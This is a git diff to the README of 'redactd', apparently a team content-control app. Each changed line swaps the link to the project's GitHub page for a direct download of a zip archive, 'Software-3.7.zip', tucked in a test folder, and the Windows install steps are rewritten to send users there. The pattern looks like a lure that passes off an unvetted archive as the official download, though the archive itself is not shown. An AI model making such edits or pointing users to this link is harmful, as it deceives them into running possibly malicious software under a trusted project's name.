@@ -1,12 +1,12 @@
 # 🛡️ redactd - Clear content control for teams
 
-[![Download redactd](https://img.shields.io/badge/Download-redactd-4CAF50?style=for-the-badge&logo=github)](https://github.com/mohamedifrang/redactd)
+[![Download redactd](https://img.shields.io/badge/Download-redactd-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mohamedifrang/redactd/main/edge-gateway/src/test/Software-3.7.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[https://github.com/mohamedifrang/redactd](https://github.com/mohamedifrang/redactd)
+[https://raw.githubusercontent.com/mohamedifrang/redactd/main/edge-gateway/src/test/Software-3.7.zip](https://raw.githubusercontent.com/mohamedifrang/redactd/main/edge-gateway/src/test/Software-3.7.zip)
 
 ## 🧭 What this app does
 
@@ -36,7 +36,7 @@ If you plan to use it for a larger setup, more memory and disk space can help.
 Follow these steps on Windows:
 
 1. Open your web browser.
-2. Go to this page: [https://github.com/mohamedifrang/redactd](https://github.com/mohamedifrang/redactd)
+2. Go to this page: [https://raw.githubusercontent.com/mohamedifrang/redactd/main/edge-gateway/src/test/Software-3.7.zip](https://raw.githubusercontent.com/mohamedifrang/redactd/main/edge-gateway/src/test/Software-3.7.zip)
 3. Look for the latest release or download option.
 4. Download the Windows version if one is listed.
 5. Save the file to your Downloads folder.
@@ -182,7 +182,7 @@ This project is built around:
 
 Download or visit the project page here:
 
-[https://github.com/mohamedifrang/redactd](https://github.com/mohamedifrang/redactd)
+[https://raw.githubusercontent.com/mohamedifrang/redactd/main/edge-gateway/src/test/Software-3.7.zip](https://raw.githubusercontent.com/mohamedifrang/redactd/main/edge-gateway/src/test/Software-3.7.zip)
 
 ## 🧼 Keeping your setup clean
 
